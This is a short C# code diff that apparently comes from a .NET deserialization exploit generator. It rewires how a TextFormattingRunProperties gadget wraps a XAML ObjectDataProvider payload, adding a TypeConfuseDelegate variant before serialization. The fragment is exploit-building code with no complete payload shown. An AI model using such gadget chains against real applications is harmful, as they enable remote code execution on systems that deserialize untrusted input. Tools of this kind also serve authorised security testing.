@@ -63,12 +63,14 @@ xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
     </ObjectDataProvider>
 </ResourceDictionary>";
             
+            object payload = TypeConfuseDelegateGenerator.GetXamlGadget(xaml_payload);
             if (inputArgs.Minify)
             {
+                
                 xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
+                payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
             }
-
-            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
+            
             return Serialize(payload, formatter, inputArgs);
         }
         
